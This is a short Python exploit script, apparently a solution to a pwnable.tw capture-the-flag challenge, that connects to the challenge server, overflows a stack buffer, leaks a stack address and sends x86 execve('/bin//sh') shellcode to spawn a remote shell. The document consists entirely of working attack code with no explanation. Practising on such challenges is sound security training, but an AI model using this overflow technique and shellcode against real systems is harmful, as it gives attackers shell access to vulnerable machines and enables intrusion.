
import socket

s = socket.socket()
s.connect(("chall.pwnable.tw",10000))
fluff =  b"\x41"*20 
byte = fluff + b"\x87\x80\x04\x08"

print(s.recv(1024))
s.send(byte)
msg = s.recv(1024)
print(msg)

offset = 6
esp = msg[-offset:]
print("esp = ",esp)
new_esp = int.to_bytes(int.from_bytes(esp,'little')+offset,offset,'little')

payload = fluff + new_esp + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

s.send(payload)
print(s.recv(1024))
#newFile = open("text.txt", "wb")

#newFile.write(byte)
